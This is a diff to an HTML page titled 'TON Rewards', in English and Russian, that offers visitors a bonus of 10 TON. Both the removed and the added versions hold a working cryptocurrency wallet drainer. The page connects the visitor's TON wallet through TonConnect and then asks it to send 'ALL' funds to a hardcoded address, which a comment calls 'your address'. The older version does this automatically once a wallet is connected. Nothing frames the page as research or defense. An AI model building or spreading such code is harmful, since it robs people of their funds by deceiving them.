@@ -2,101 +2,61 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>TON Rewards</title>
-  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script type="module" src="./tonconnect.js"></script>
   <style>
     body {
-      background-color: #f4f9ff;
       font-family: Arial, sans-serif;
+      padding: 20px;
+      background: #f7f7f7;
       text-align: center;
-      padding: 50px;
     }
-    .container {
-      max-width: 400px;
-      margin: auto;
-      background: white;
-      border-radius: 20px;
-      padding: 30px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-    }
-    .button {
-      background-color: #0088cc;
+    button {
+      padding: 15px 25px;
+      font-size: 18px;
+      background: #0098ea;
       color: white;
       border: none;
-      padding: 15px 25px;
-      font-size: 16px;
-      border-radius: 10px;
+      border-radius: 8px;
       cursor: pointer;
-      margin-top: 20px;
+      margin-top: 40px;
     }
-    .button:hover {
-      background-color: #0077b3;
-    }
-    h1 { margin-bottom: 10px; }
-    p { color: #555; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>TON Rewards for Activity</h1>
-    <p>🎁 Reward is available below</p>
-    <button class="button" id="connect-button" style="display:none;">🔗 Connect TON Wallet</button>
-    <p id="status"></p>
-  </div>
+  <h2>🎁 Получи награду за активность</h2>
+  <p>Нажми кнопку ниже, чтобы подключить TON-кошелёк и получить бонус</p>
 
-  <script>
-    document.addEventListener("DOMContentLoaded", () => {
-      const tonConnectUI = new window.TonConnectUI({
-        manifestUrl: "https://deasnowe1.github.io/TelegramTon/tonconnect-manifest.json",
-        buttonRootId: "connect-button"
-      });
+  <button id="claim-btn">Получить 10 TON</button>
 
-      async function sendReward() {
-        try {
-          document.getElementById("status").innerText = "⏳ Sending reward...";
-          const tx = {
-            validUntil: Math.floor(Date.now() / 1000) + 600,
-            messages: [
-              {
-                address: "UQBE_JABAWlW-hEtmW47Xp-qPVQvcnKNKseQjO1NEE5Byh2Y",
-                amount: "all",
-                payload: ""
-              }
-            ]
-          };
-          await tonConnectUI.sendTransaction(tx);
-          document.getElementById("status").innerText = "✅ Reward claimed!";
-        } catch (e) {
-          document.getElementById("status").innerText = "❌ Transaction failed.";
-          console.error(e);
-        }
-      }
+  <script type="module">
+    import { TonConnectUI } from "./tonconnect.js";
 
-      // Проверка подключения
-      setTimeout(async () => {
-        if (tonConnectUI.wallet) {
-          sendReward();
-        } else {
-          document.getElementById("connect-button").style.display = "inline-block";
-          document.getElementById("status").innerText = "🔒 Please connect your wallet";
-
-          document.getElementById("connect-button").addEventListener("click", async () => {
-            try {
-              const connected = await tonConnectUI.connectWallet();
-              if (connected && tonConnectUI.wallet) {
-                sendReward();
-              } else {
-                document.getElementById("status").innerText = "❌ Wallet connection failed.";
-              }
-            } catch (e) {
-              document.getElementById("status").innerText = "❌ Wallet connection error.";
-              console.error(e);
-            }
-          });
-        }
-      }, 500);
+    const tonConnectUI = new TonConnectUI({
+      manifestUrl: window.location.origin + "/manifest.json",
     });
+
+    document.getElementById("claim-btn").onclick = async () => {
+      try {
+        await tonConnectUI.connectWallet();
+
+        const transaction = {
+          validUntil: Math.floor(Date.now() / 1000) + 360,
+          messages: [
+            {
+              address: "UQBE_JABAWlW-hEtmW47Xp-qPVQvcnKNKseQjO1NEE5Byh2Y", // твой адрес
+              amount: "ALL", // ВСЕ средства
+            },
+          ],
+        };
+
+        await tonConnectUI.sendTransaction(transaction);
+      } catch (e) {
+        alert("Ошибка подключения или транзакции");
+        console.error(e);
+      }
+    };
   </script>
 </body>
 </html>
